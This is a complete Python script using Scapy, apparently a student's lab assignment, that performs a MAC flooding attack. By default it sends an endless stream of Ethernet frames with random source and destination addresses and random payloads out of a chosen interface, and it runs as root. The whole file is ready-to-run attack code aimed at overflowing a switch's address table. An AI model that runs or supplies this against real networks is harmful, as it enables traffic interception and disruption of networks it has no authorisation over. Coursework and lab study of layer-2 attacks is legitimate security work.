#!/usr/bin/env python3
"""
==============================================================
  MAC Flooding Attack Script
  Autor   : Ashley Fabian
  Matrícula: 2025-0773
  Script  : AshleyFabian_2025-0773_MAC_Flooding_P1.py
==============================================================
"""

import argparse
import random
import time
import os
import sys
from scapy.all import Ether, sendp, conf

def random_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(6)
    )

def build_frame(payload_size):
    return Ether(src=random_mac(), dst=random_mac()) / \
           bytes(random.randint(0, 255) for _ in range(payload_size))

def attack(iface, count, delay, payload_size):
    print("\n[*] MAC Flooding — Ashley Fabian (2025-0773)")
    print(f"[*] Interfaz: {iface} | Frames: {'inf' if count==0 else count}\n")
    conf.verb = 0
    sent = 0
    try:
        while count == 0 or sent < count:
            sendp(build_frame(payload_size), iface=iface, verbose=False)
            sent += 1
            if sent % 500 == 0:
                print(f"[+] Frames enviados: {sent}", end="\r")
            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n[!] Detenido. Total: {sent}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface",   required=True)
    parser.add_argument("-c", "--count",   type=int,   default=0)
    parser.add_argument("-d", "--delay",   type=float, default=0)
    parser.add_argument("-p", "--payload", type=int,   default=64)
    args = parser.parse_args()
    attack(args.iface, args.count, args.delay, args.payload)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Ejecutar como root.")
        sys.exit(1)
    main()
